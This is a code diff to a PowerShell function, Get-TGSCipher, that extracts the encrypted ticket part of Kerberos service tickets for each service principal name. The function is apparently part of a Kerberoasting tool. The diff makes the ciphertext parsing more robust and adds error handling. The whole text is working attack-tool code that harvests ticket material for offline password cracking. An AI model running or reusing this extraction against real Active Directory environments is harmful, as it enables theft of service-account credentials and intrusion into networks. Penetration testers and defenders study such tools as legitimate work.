@@ -101,20 +101,32 @@ function Get-TGSCipher
                 23      {"RC4-HMAC (23)"}
                 default {"Unknown ($eType)"}
             }
-            #extracting the EncPart portion of the TGS
-            $EncPart = $HexStream -replace ".*048204.." -replace "A48201.*"
-            $Target = New-Object psobject -Property @{
+            try {
+                #extracting the EncPart portion of the TGS
+                [System.Collections.ArrayList]$Parts = ($HexStream -replace ".*048204..").Split("A48201")
+                if ($Parts.Count -gt 2) {
+                    $Parts.RemoveAt($Parts.Count - 1)
+                    $EncPart = $Parts -join "A48201"
+                }
+                else {
+                    $EncPart = $Parts[0]
+                }
+                $Target = New-Object psobject -Property @{
                 SPN            = $SPN
                 Target         = $TargetAccount
                 EncryptionType = $EncType
                 EncTicketPart  = $EncPart  
-            } | Select-Object SPN,Target,EncryptionType,EncTicketPart
-            $TargetList += $Target    
+                } | Select-Object SPN,Target,EncryptionType,EncTicketPart
+                $TargetList += $Target    
+            }
+            catch {
+                Write-Warning "Couldn't extract the EncTicketPart of SPN: $SPN - purge the ticket and try again"
+            }
         }
     }
     End {
         if (!$TargetList.EncTicketPart) {
-            Write-Warning "Could not retrieve any tickets!"
+            Write-Error "Could not retrieve any tickets!"
         }
         elseif ($Format)
         {
